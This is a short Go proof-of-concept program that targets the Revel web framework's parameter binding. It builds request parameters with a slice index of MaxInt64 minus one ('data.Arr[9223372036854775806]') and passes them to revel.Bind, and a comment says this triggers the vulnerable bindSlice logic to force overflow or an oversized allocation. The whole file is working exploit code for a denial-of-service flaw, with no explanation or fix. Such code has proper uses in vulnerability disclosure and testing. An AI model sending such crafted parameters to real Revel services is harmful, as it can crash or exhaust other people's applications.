package main

import (
	"github.com/revel/revel"
	"github.com/revel/config"
	"net/url"
	"reflect"
)

type Data struct {
	Arr []int
}

func main() {
	if revel.Config == nil {
		revel.Config = config.NewContext()
	}
	params := &revel.Params{
		Values: url.Values{
			"data.Arr[0]":                   []string{"1"},
			"data.Arr[9223372036854775806]": []string{"2"}, // MaxInt64 - 1 to force overflow/oversize
		},
	}

	var d Data
	// This call triggers the vulnerable bindSlice logic
	revel.Bind(params, "data", reflect.TypeOf(d))
}